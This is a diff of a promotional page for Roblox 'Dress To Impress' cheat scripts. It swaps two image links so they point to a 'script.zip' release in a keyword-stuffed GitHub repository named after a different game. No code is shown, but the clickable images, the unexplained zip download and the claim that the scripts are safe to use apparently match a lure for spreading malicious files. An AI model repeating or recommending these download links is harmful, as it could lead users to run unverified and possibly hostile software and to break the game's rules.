@@ -5,10 +5,10 @@ Looking to dominate the fashion world in **Dress To Impress** on Roblox? Whether
 In this guide, we’ll walk you through the latest working scripts for **Dress To Impress**, what they can do, how to use them safely, and where to download the most reliable versions. If you want to stay fashionable and always be a top model in the game — this is your ultimate resource.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Packet-star/studious-fishstick/releases/download/new/script.zip)
+](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
 
 [![hq720](https://github.com/user-attachments/assets/ad590273-17de-4cc7-9322-b9f5e21c8094)
-](https://github.com/Packet-star/studious-fishstick/releases/download/new/script.zip)
+](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
 
 ---
 
